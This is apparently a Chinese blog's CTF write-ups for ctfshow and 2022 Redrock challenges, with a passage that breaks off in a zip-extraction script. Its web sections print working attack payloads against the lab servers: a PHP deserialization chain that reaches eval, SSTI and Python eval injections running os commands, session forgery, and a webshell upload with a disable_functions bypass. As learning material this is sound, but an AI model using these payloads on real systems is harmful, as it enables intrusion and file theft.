<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;一个不能说的秘密&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h3><p>下载下来是一个加密的压缩包，按照惯例先试试是不是伪加密</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042122149.png" alt="image-20230404212240131"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042123133.png" alt="image-20230404212308114"></p>
<p>这两个位置都换成00 00，保存打开得到black.png</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042124771.png" alt="image-20230404212400755"></p>
<p>显示了半截，先猜测高度隐写</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042126761.png" alt="image-20230404212648742"></p>
<p>把第二段的96改成等高度384试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042127702.png" alt="image-20230404212730674"></p>
<p>得到全文，但是还是得binwalk看一下有没有藏比</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354105.png" alt="image-20230404235003535"></p>
<p>有藏比，用foremost分离一下得到一个png和zip文件</p>
<p>其实在black.png最后边有提示key，base64之后就是“yurenjie”，这是压缩密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354312.png" alt="image-20230404235153184"></p>
<p>得到flag.png，还是高度隐写，修改之后就能得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354502.png" alt="image-20230404235248682"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;Th1s_i5_f1ag&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>是个base64编码之后传值到img显示图片</p>
<p>把index.php base64后传进去得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042357547.png" alt="image-20230404235735530"></p>
<p>解码得到内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042358391.png" alt="image-20230404235801368"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;eff420e3-947e-4c4b-816a-ed8810990daf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h3><p>这题解法太多了，能用php原生类做，学长两步就直接做出来了，根本没用到加密函数</p>
<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>我的步骤还是有点繁琐</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># 当前目录中有一个txt文件哦</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;check.php&quot;);</span><br><span class="line"></span><br><span class="line">class EeE&#123;</span><br><span class="line">    public $text;</span><br><span class="line">    public $eeee;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if ($this-&gt;text == &quot;aaaa&quot;)&#123;</span><br><span class="line">            echo lcfirst($this-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($kk)&#123;</span><br><span class="line">        echo &quot;$kk,eeeeeeeeeeeee&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cycycycy&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    private $b;</span><br><span class="line"></span><br><span class="line">    public function aaa()&#123;</span><br><span class="line">        $get = $_GET[&#x27;get&#x27;];</span><br><span class="line">        $get = cipher($get);</span><br><span class="line">        if($get === &quot;p8vfuv8g8v8py&quot;)&#123;</span><br><span class="line">            eval($_POST[&quot;eval&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $a_a = $this -&gt; a;</span><br><span class="line">        echo &quot;\$a_a\$&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class gBoBg&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $file;</span><br><span class="line">    public $coos;</span><br><span class="line">    private $eeee=&quot;-_-&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;name))&#123;</span><br><span class="line">            $a = new $this-&gt;coos($this-&gt;file);</span><br><span class="line">            echo $a;</span><br><span class="line">        &#125;else if(!isset($this -&gt; file))&#123;</span><br><span class="line">            return $this-&gt;coos-&gt;name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $aa = $this-&gt;coos;</span><br><span class="line">            $bb = $this-&gt;file;</span><br><span class="line">            return $aa();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line">class w_wuw_w&#123;</span><br><span class="line">    public $aaa;</span><br><span class="line">    public $key;</span><br><span class="line">    public $file;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(!preg_match(&quot;/php|63|\*|\?/i&quot;,$this -&gt; key))&#123;</span><br><span class="line">            $this-&gt;key = file_get_contents($this -&gt; file);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;不行哦&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];</span><br><span class="line">unserialize($_ip);</span><br></pre></td></tr></table></figure>

<p>就四个类，还是很好做的</p>
<p>由于不知道其中cipher()函数的加密方式，所以得先看看包含的check.php内容是什么（byd他说的那个txt根本扫不出来，还是我最后做完才翻的目录是h1nt.txt💧）</p>
<p>在w_wuw_w类中有file_get_contents()函数可以方便的把$file外带出来，但是他只在destruct的时候echo出$aaa，所以就要用到之前狗学长说过的引用&amp;赋值</p>
<p>让$aaa &#x3D; &amp;$file，使得这两个变量指向相同地址，这样两个变量的内容就会同时改变</p>
<p>构造出payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$w_wuw_w = new w_wuw_w();</span><br><span class="line">$w_wuw_w -&gt; key = &#x27;test&#x27;;</span><br><span class="line">$w_wuw_w -&gt; file = &#x27;check.php&#x27;;</span><br><span class="line">$w_wuw_w -&gt; aaa = &amp;$w_wuw_w -&gt; key;</span><br><span class="line">O:7:&quot;w_wuw_w&quot;:4:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;s:4:&quot;test&quot;;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;s:0:&quot;&quot;;R:3;&#125;</span><br></pre></td></tr></table></figure>

<p>外带出check.php的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050012246.png" alt="image-20230405001238222"></p>
<p>略加修改一下就得到了具体的内容，分析一下能写出解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_string(input_string):</span><br><span class="line">    charset = &quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span><br><span class="line">    shift = 4</span><br><span class="line">    shifted = &quot;&quot;</span><br><span class="line">    for char in input_string:</span><br><span class="line">        pos = charset.find(char)</span><br><span class="line">        if pos != -1:</span><br><span class="line">            new_pos = (pos + shift + len(charset)) % len(charset)</span><br><span class="line">            shifted += charset[new_pos]</span><br><span class="line">        else:</span><br><span class="line">            shifted += char</span><br><span class="line">    return shifted</span><br><span class="line">print(decrypt_string(&#x27;p8vfuv8g8v8py&#x27;))</span><br></pre></td></tr></table></figure>

<p>得到原本get该传入的值：fe1ka1ele1efp</p>
<p>由w_wuw_w的echo函数又可以调用__toString，总结一下得到pop链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w_wuw_w::__destruct() -&gt; gBoBg::__toString() -&gt; w_wuw_w::__invoke() -&gt; EeE::__clone() -&gt; cycycycy::aaa()</span><br><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:4:&quot;test&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;s:2:&quot;63&quot;;s:4:&quot;file&quot;;N;&#125;&#125;s:3:&quot;key&quot;;s:2:&quot;63&quot;;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>同时传入?get&#x3D;fe1ka1ele1efp;eval&#x3D;system(‘ls &#x2F;‘);</p>
<p>就可得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050016174.png" alt="image-20230405001615152"></p>
<p>cat一下就行</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050016060.png" alt="image-20230405001637044"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;be571200-b78b-4bfe-ba08-71787e58acb6&#125;</span><br></pre></td></tr></table></figure>

<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new w_wuw_w();</span><br><span class="line">$b=new gBoBg();</span><br><span class="line">$a-&gt;aaa=$b;</span><br><span class="line">$b-&gt;name=123;</span><br><span class="line">$b-&gt;coos=&quot;SplFileObject&quot;;</span><br><span class="line">$b-&gt;file=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>加请求头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAAAA:O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;i:123;s:4:&quot;file&quot;;s:11:&quot;glob:///*f*&quot;;s:4:&quot;coos&quot;;s:17:&quot;DirectoryIterator&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br><span class="line">#得到文件名：f1agaaa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAAAA:O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;i:123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=/f1agaaa&quot;;s:4:&quot;coos&quot;;s:13:&quot;SplFileObject&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>用的是php原生类，glob直接查flag，SplFileObject查flag，太快了</p>
<h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><p>提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050025322.png" alt="image-20230405002511299"></p>
<p>打开看到是常见的ssti</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050025174.png" alt="image-20230405002546148"></p>
<p>用hackbar的ssti换几个试试，找到app.py的源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050028102.png" alt="image-20230405002846077"></p>
<p>很明显，要求过滤了f和&#x2F;，但是如果里边有ge就可以正常解析</p>
<p>由于要先出现ge，那就构造shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ge=&quot;test&quot;;cd ..;cat flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050036618.png" alt="image-20230405003607596"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;1fe332f3-a27d-44f2-b864-2416b80c021e&#125;</span><br></pre></td></tr></table></figure>

<p>其实扫网的时候有console目录，也可以通过ssti得到机器信息算出pin码直接执行python命令，不过更复杂了</p>
<h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><p>相似，只不过狗学长用的cat命令更巧妙，没有构造ge</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat $&#123;PATH:0:1&#125;[9-q][9-q][9-q][9-q]</span><br></pre></td></tr></table></figure>

<p>用${PATH:0:1}代替&#x2F;，正则[9-q]匹配flag四个字母</p>
<h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p>官方给的题解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hello/&#123;&#123; &quot;&quot;.__class__.__base__ .__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](request.args.get(&quot;ctfshow&quot;)).read()&#125;&#125;ge?ctfshow=cat /flag </span><br></pre></td></tr></table></figure>

<h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>打开是个登陆页面，用sqlmap也爆不出来，就尝试直接注册登陆看看内容</p>
<p>登陆进去提示我的角色是user，当角色是admin的时候会给出东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051204342.png" alt="image-20230405120423293"></p>
<p>再看看learn的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051206785.png" alt="image-20230405120609765"></p>
<p>给出了app.secret_key &#x3D; ‘S3cr3tK3y’，在burp里又能看到cookie内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051206709.png" alt="image-20230405120639690"></p>
<p>base64解码出来就能看到信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051207045.png" alt="image-20230405120713026"></p>
<p>所以就用工具伪造一下session</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051210297.png" alt="image-20230405121020273"></p>
<p>加密后用burp传进去就有任意文件下载的功能</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051211084.png" alt="image-20230405121111065"></p>
<p>看一下app.py是怎么写的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051216349.png" alt="image-20230405121604328"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051216781.png" alt="image-20230405121621759"></p>
<p>分别给出了admin的密码和一个hello路径，有eval利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).system(&#x27;ls / &gt; test&#x27;)</span><br></pre></td></tr></table></figure>

<p>然后任意文件读取test</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051225286.png" alt="image-20230405122559265"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).system(&#x27;cat /flag_is_h3re &gt; test&#x27;)</span><br></pre></td></tr></table></figure>

<p>或者更直接一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).popen(&#x27;cat /*f*&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;d7cbfb77-b2fb-47ee-ade9-e78bd40c9871&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h3><p>一把梭脚本</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051240312.png" alt="image-20230405124031283"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;yu_ren_j1e_haPpy!!!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2022红岩新生杯</title>
    <url>/2024/01/07/2022%E7%BA%A2%E5%B2%A9%E6%96%B0%E7%94%9F%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单题，但是沃玛"><a href="#简单题，但是沃玛" class="headerlink" title="简单题，但是沃玛"></a>简单题，但是沃玛</h3><p>在js文件里看到redrockctf函数，flag应该就在这里边</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201850817.png" alt="1"></p>
<p>本来看到”Uh，f1a9!”的时候以为只有f1a9才是真正的flag，还蒙了好久，直到出了hint</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201852662.png" alt="0"></p>
<p>ok，那手拼函数就完事了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201852336.png" alt="2"></p>
<p>第三部分分了两个，分别解码一下就出来了两个方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211539112.png" alt="3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201853359.png" alt="4"></p>
<p>写个c跑一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201903785.png" alt="5"></p>
<p>显然第一个刚好是沃玛的b站uid，再把三个拼接起来就得到flag了（后边的#redr0cksrE2o22也要加上）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;https://space.bilibili.com/53456#redr0cksrE2o22&#125;</span><br></pre></td></tr></table></figure>

<h3 id="你是哪里的"><a href="#你是哪里的" class="headerlink" title="你是哪里的"></a>你是哪里的</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201906573.png" alt="1"></p>
<p>直接打开，发现让我必须来自<a href="https://redrock.team/">https://redrock.team</a></p>
<p>那就用burpsuite加上referer栏</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201907652.png" alt="2"></p>
<p>发过去得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201908413.png" alt="3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;we1c0me t0 redr0ck ctf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="我新写的代码啊"><a href="#我新写的代码啊" class="headerlink" title="我新写的代码啊"></a>我新写的代码啊</h3><p>进入网页发现看不出来啥</p>
<p>dirsearch开扫，发现bak文件，下载</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201914714.png" alt="0"></p>
<p>index.bak文件如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201915182.png" alt="1"></p>
<p>分析一下可知if判断的路劲如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201915590.png" alt="路径"></p>
<p>看到两个判断是用md5，两个是用文本匹配，那就看一下md5加密绕过构建ABabc五个内容</p>
<p>参考：<a href="https://blog.csdn.net/Jeff_12138/article/details/121847582">PHP中MD5加密的简单绕过及基于MD5加密的SQL注入_Landasika的博客-CSDN博客</a></p>
<p>用GET方法试一下md5绕过是否成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201917019.png" alt="2"></p>
<p>看来确实是可行的，但是文中写到c要用POST方法传</p>
<p>参考：<a href="https://blog.csdn.net/Zhuoqian_1/article/details/114486774">get_post 攻防世界 使用burpsuite发送GET、POST请求_Zhuoqian_1的博客-CSDN博客</a></p>
<p>构建一下c传过去，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201918214.png" alt="3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Php!sv2ryg004&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RemindYourHead"><a href="#RemindYourHead" class="headerlink" title="RemindYourHead"></a>RemindYourHead</h3><p>把网址在burpsuite中打开一下，翻出来flag</p>
<p>(这flag每次都不一样，我比赛截的图和复现截的图不是同一个)</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201921996.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;820a5bf5-4df9-4058-84a4-054af00b3b78&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Easy-upload"><a href="#Easy-upload" class="headerlink" title="Easy_upload"></a>Easy_upload</h3><p>看到hint，提示有两个flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201924055.png" alt="0"></p>
<p>看到是上传题，试一下一句话木马，但被拒绝了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201925592.png" alt="1"></p>
<p>那就试一下.htaccess文件绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201926618.png" alt="2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929343.png" alt="2-1"></p>
<p>在burp中把.jpg去掉，实现上传，再次上传一句话木马还是不行，那可能就在内容被检测了</p>
<p>参考：<a href="https://blog.csdn.net/weixin_42250835/article/details/120058908">WEB漏洞攻防 - 文件上传漏洞 - CTF - [极客大挑战 2019]Upload-1</a></p>
<p>制作一下变形马，然后上传成功了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929197.png" alt="3"></p>
<p>打开蚁剑然后连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929456.png" alt="4"></p>
<p>上传根目录发现一个flag和readflag，这个flag应该是真flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201937561.png" alt="readflag"></p>
<p>在终端里发现是一点权限没有</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930476.png" alt="5"></p>
<p>看一下phpinfo</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930699.png" alt="6"></p>
<p>被禁用的函数有这么多</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930096.png" alt="7"></p>
<h4 id="法一：蚁剑插件"><a href="#法一：蚁剑插件" class="headerlink" title="法一：蚁剑插件"></a>法一：蚁剑插件</h4><p>那就用蚁剑里的插件绕过一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201931865.png" alt="8"></p>
<p>由于<strong>LD_PRELOAD需要基于php连接才能绕过</strong>，所以我之前传的变形马是<strong>不能用</strong>的</p>
<p>所以用蚁剑的上传功能，在上传根目录上传简单的一句话木马</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201935439.png" alt="12"></p>
<p> 然后重新制作.antproxy.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211529491.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201936689.png" alt="15"></p>
<p>完成绕过了disable_function，那就进入终端，输入readflag里提示的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac ./flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201939704.png" alt="17"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;2315jih452ghu542o5431giu5214huiog35431hp&#125;</span><br></pre></td></tr></table></figure>

<h4 id="法二：LD-PRELOAD无插件版"><a href="#法二：LD-PRELOAD无插件版" class="headerlink" title="法二：LD_PRELOAD无插件版"></a>法二：LD_PRELOAD无插件版</h4><p>详情[<a href="https://redrock.feishu.cn/wiki/wikcnXw7EpomHHepm1HGObUF4pC">web]Easy_upload - 飞书云文档 (feishu.cn)</a></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>RT</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201942248.jpg" alt="0"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;020804&#125;</span><br></pre></td></tr></table></figure>

<h3 id="芝士雪豹与只因"><a href="#芝士雪豹与只因" class="headerlink" title="芝士雪豹与只因"></a>芝士雪豹与只因</h3><p>hint是一个png，先丢到binwalk里看看有没有藏东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201952692.png" alt="0"></p>
<p>有藏另一个图片文件，那就foremost提取出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201953102.png" alt="1"></p>
<p>看到是个二维码，但是左上左下缺了数据，那就用ps补全，然后扫码得到了提示：密码是qingshui</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201953133.png" alt="2"></p>
<p>知道有密码，优先考虑一下MP3Stego，得到了个txt文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201955296.png" alt="3"></p>
<p>里边是emoji，那就考虑一下base100解码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201956800.png" alt="4"></p>
<p>再把得到的用base64再解码得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201956409.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Sn0w_le0pard_Shut_up&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bug"><a href="#bug" class="headerlink" title="bug:"></a>bug:</h4><p>最开始用的mp3stego可能是版本有问题，丢进去提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenTable: could not find tables/huffdec </span><br><span class="line">Check local directory &#x27;./tables/&#x27; </span><br><span class="line">Please check huffman table &#x27;huffdec&#x27;</span><br></pre></td></tr></table></figure>

<p>在github上再下一个就解决了</p>
<h3 id="啵啵的魔法药水"><a href="#啵啵的魔法药水" class="headerlink" title="啵啵的魔法药水"></a>啵啵的魔法药水</h3><p>看到是docker题</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202002712.png" alt="0"></p>
<h4 id="法一：直接在docker-hub里找"><a href="#法一：直接在docker-hub里找" class="headerlink" title="法一：直接在docker hub里找"></a>法一：直接在docker hub里找</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202003998.png" alt="1"></p>
<p>往下翻看到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202003617.png" alt="2"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Wit-Sharpening_Potion.&#125;</span><br></pre></td></tr></table></figure>

<p>其实这个方法是无奈之举，我kali安装的podman，甚至没办法pull这个镜像</p>
<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>卸载podman然后安装docker，pull这个镜像</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202005056.png" alt="0-6"></p>
<p>然后用docker inspect查看镜像内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006421.png" alt="2-1"></p>
<p>往下翻找到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211603799.png" alt="2-2"></p>
<h4 id="补：卸载podman"><a href="#补：卸载podman" class="headerlink" title="补：卸载podman"></a>补：卸载podman</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006699.png" alt="0-1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202007763.png" alt="0-2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006493.png" alt="0-3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006524.png" alt="0-4"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202007221.png" alt="0-5"></p>
<h3 id="你TM故意压缩flag是吧？"><a href="#你TM故意压缩flag是吧？" class="headerlink" title="你TM故意压缩flag是吧？"></a>你TM故意压缩flag是吧？</h3><p>显然，这是个有114514层的多层压缩，那就写个循环解压脚本</p>
<p>参考：<a href="https://blog.csdn.net/brightendavid/article/details/115637957">递归解压zip文件_brightendavid的博客-CSDN博客</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> = <span class="string">&quot;C:\\Users\\*****\\Desktop\\work\\ctf\\unzip\\&quot;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">s2 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jieya</span>():</span><br><span class="line">        i = <span class="string">&quot;14514.zip&quot;</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span 